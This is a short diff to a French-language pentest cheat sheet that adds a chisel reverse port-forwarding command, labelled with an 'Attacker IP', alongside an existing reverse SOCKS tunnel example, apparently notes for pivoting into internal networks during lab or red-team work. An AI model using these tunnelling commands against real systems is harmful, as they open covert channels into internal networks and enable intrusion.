@@ -48,6 +48,18 @@ chisel server -p 8001 --reverse
 ```
 ./chisel_amd64 client 10.50.111.37:8001 R:socks &
 ```
+#### Port distant vers port local
+
+```
+./chisel.exe client 10.14.50.100:8001 R:2805:10.10.2.0:2805
+```
+10.14.50.100: Attacker IP
+<br>
+8001: Port établie lors de la création du serveur
+<br>
+<br>
+2805:10.10.2.0:2805 -> Bind le port 2805 de la machine Attacker au port 2805 de la machine distante 
+
 <br>
 <br>
 
